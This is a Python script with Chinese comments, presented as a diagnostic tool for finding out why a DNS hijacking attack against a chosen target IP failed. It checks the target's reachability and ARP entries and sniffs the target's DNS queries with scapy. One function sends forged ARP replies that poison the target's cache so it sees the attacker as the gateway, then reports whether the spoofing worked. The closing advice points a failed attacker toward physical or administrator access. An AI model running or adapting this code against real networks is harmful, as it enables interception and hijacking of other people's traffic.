#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
网络诊断工具 - 分析DNS劫持失败原因
检测网络连通性、流量路径、ARP表状态等
"""

import os
import sys
import socket
import subprocess
import time
from datetime import datetime
from scapy.all import *

def check_network_connectivity(target_ip, gateway_ip):
    """检查网络连通性"""
    print("🔍 网络连通性检查")
    print("-" * 50)
    
    # 检查目标设备
    print(f"1. 目标设备 ({target_ip}):")
    result = os.system(f"ping -n 2 {target_ip}")
    if result == 0:
        print("   ✅ 目标设备可达")
    else:
        print("   ❌ 目标设备不可达")
        print("   💡 可能原因: 设备离线、网络隔离、防火墙阻挡")
    
    # 检查网关
    print(f"\n2. 网关设备 ({gateway_ip}):")
    result = os.system(f"ping -n 2 {gateway_ip}")
    if result == 0:
        print("   ✅ 网关设备可达")
    else:
        print("   ❌ 网关设备不可达")
        print("   💡 可能原因: 网关故障、网络配置错误")
    
    # 检查互联网连接
    print(f"\n3. 互联网连接:")
    result = os.system("ping -n 2 8.8.8.8")
    if result == 0:
        print("   ✅ 互联网连接正常")
    else:
        print("   ❌ 互联网连接异常")

def check_arp_table(target_ip, gateway_ip):
    """检查ARP表状态"""
    print("\n🔍 ARP表状态检查")
    print("-" * 50)
    
    try:
        # 获取ARP表
        result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
        arp_table = result.stdout
        
        # 检查目标设备是否在ARP表中
        if target_ip in arp_table:
            print(f"   ✅ 目标设备 ({target_ip}) 在ARP表中")
            # 提取MAC地址
            for line in arp_table.split('\n'):
                if target_ip in line:
                    print(f"      {line.strip()}")
        else:
            print(f"   ❌ 目标设备 ({target_ip}) 不在ARP表中")
            print("   💡 需要先ping目标设备以获取MAC地址")
        
        # 检查网关是否在ARP表中
        if gateway_ip in arp_table:
            print(f"   ✅ 网关设备 ({gateway_ip}) 在ARP表中")
            for line in arp_table.split('\n'):
                if gateway_ip in line:
                    print(f"      {line.strip()}")
        else:
            print(f"   ❌ 网关设备 ({gateway_ip}) 不在ARP表中")
    
    except Exception as e:
        print(f"   ❌ ARP表检查失败: {e}")

def check_network_segmentation():
    """检查网络分段情况"""
    print("\n🔍 网络分段检查")
    print("-" * 50)
    
    # 获取本机IP和子网掩码
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        # 获取默认网关
        result = subprocess.run(['route', 'print'], capture_output=True, text=True)
        
        print(f"   本机IP: {local_ip}")
        
        # 分析路由表
        for line in result.stdout.split('\n'):
            if '0.0.0.0' in line and 'On-link' not in line:
                parts = line.split()
                if len(parts) > 3:
                    print(f"   默认网关: {parts[2]}")
                    print(f"   子网掩码: {parts[3]}")
                    
                    # 检查是否在同一子网
                    target_net = ".".join(parts[2].split(".")[:3]) + ".0"
                    local_net = ".".join(local_ip.split(".")[:3]) + ".0"
                    
                    if target_net == local_net:
                        print("   ✅ 目标设备在同一子网")
                    else:
                        print("   ❌ 目标设备在不同子网")
                        print("   💡 需要路由器或三层设备转发")
                    break
    
    except Exception as e:
        print(f"   ❌ 网络分段检查失败: {e}")

def monitor_dns_traffic(target_ip, duration=30):
    """监控DNS流量"""
    print(f"\n🔍 DNS流量监控 ({duration}秒)")
    print("-" * 50)
    
    dns_queries = 0
    start_time = time.time()
    
    def packet_handler(pkt):
        nonlocal dns_queries
        
        if pkt.haslayer(DNS) and pkt.haslayer(IP):
            dns = pkt[DNS]
            ip = pkt[IP]
            
            # 只处理DNS查询
            if dns.qr == 0 and dns.qd:
                query_name = dns.qd.qname.decode('utf-8').rstrip('.')
                
                # 检查是否来自目标设备
                if ip.src == target_ip:
                    dns_queries += 1
                    current_time = time.time() - start_time
                    print(f"   [{current_time:.1f}s] 检测到DNS查询: {query_name}")
    
    try:
        print("   开始监听DNS流量...")
        print("   💡 请在目标设备上访问网站以生成DNS查询")
        
        # 开始嗅探
        sniff(
            filter=f"udp port 53 and host {target_ip}",
            prn=packet_handler,
            store=0,
            timeout=duration
        )
        
        if dns_queries == 0:
            print(f"\n   ❌ 在 {duration} 秒内未检测到任何DNS查询")
            print("   💡 可能原因:")
            print("      • 目标设备未进行网络访问")
            print("      • 网络流量未经过本机")
            print("      • 目标设备使用DoH/DoT加密DNS")
            print("      • 网络隔离或VLAN限制")
        else:
            print(f"\n   ✅ 检测到 {dns_queries} 个DNS查询")
    
    except Exception as e:
        print(f"   ❌ DNS流量监控失败: {e}")

def test_arp_spoofing(target_ip, gateway_ip):
    """测试ARP欺骗效果"""
    print("\n🔍 ARP欺骗效果测试")
    print("-" * 50)
    
    try:
        # 先获取原始ARP表
        result = subprocess.run(['arp', '-a', target_ip], capture_output=True, text=True)
        original_mac = ""
        
        for line in result.stdout.split('\n'):
            if target_ip in line:
                parts = line.split()
                if len(parts) >= 2:
                    original_mac = parts[1]
                    print(f"   原始网关MAC: {original_mac}")
                    break
        
        # 发送ARP欺骗包
        print("   发送ARP欺骗包...")
        
        for i in range(3):
            # 欺骗目标：网关的MAC是我们
            pkt = ARP(op=2, psrc=gateway_ip, pdst=target_ip)
            send(pkt, verbose=False)
            time.sleep(1)
        
        print("   等待ARP表更新...")
        time.sleep(3)
        
        # 检查ARP表变化
        result = subprocess.run(['arp', '-a', target_ip], capture_output=True, text=True)
        
        for line in result.stdout.split('\n'):
            if target_ip in line:
                parts = line.split()
                if len(parts) >= 2:
                    new_mac = parts[1]
                    print(f"   当前网关MAC: {new_mac}")
                    
                    if new_mac != original_mac and new_mac != "":
                        print("   ✅ ARP欺骗成功")
                    else:
                        print("   ❌ ARP欺骗失败")
                        print("   💡 可能原因: 交换机防护、静态ARP、网络隔离")
                    break
    
    except Exception as e:
        print(f"   ❌ ARP欺骗测试失败: {e}")

def generate_diagnosis_report(target_ip, gateway_ip):
    """生成诊断报告"""
    print("\n" + "=" * 60)
    print("             网络诊断报告")
    print("=" * 60)
    
    print(f"诊断时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"目标设备: {target_ip}")
    print(f"网关设备: {gateway_ip}")
    
    # 执行各项检查
    check_network_connectivity(target_ip, gateway_ip)
    check_arp_table(target_ip, gateway_ip)
    check_network_segmentation()
    
    # 询问是否进行DNS监控
    choice = input("\n🔍 是否进行DNS流量监控? (y/N): ").strip().lower()
    if choice == 'y':
        monitor_dns_traffic(target_ip, 30)
    
    # 询问是否测试ARP欺骗
    choice = input("\n🔍 是否测试ARP欺骗效果? (y/N): ").strip().lower()
    if choice == 'y':
        test_arp_spoofing(target_ip, gateway_ip)
    
    print("\n" + "=" * 60)
    print("            诊断完成")
    print("=" * 60)

def main():
    """主函数"""
    print("=" * 70)
    print("             网络诊断工具")
    print("          分析DNS劫持失败原因")
    print("=" * 70)
    
    # 获取目标信息
    target_ip = input("\n请输入目标IP地址: ").strip()
    if not target_ip:
        print("[-] 必须输入目标IP")
        return
    
    gateway_ip = input("请输入网关IP地址: ").strip()
    if not gateway_ip:
        print("[-] 必须输入网关IP")
        return
    
    # 开始诊断
    generate_diagnosis_report(target_ip, gateway_ip)
    
    print("\n💡 根据诊断结果，建议采取以下措施:")
    print("1. 如果网络不可达: 检查网络连接和防火墙")
    print("2. 如果ARP欺骗失败: 可能需要物理网络访问")
    print("3. 如果检测不到DNS流量: 目标可能使用加密DNS")
    print("4. 如果网络隔离: 需要管理员权限或物理访问")

if __name__ == "__main__":
    main()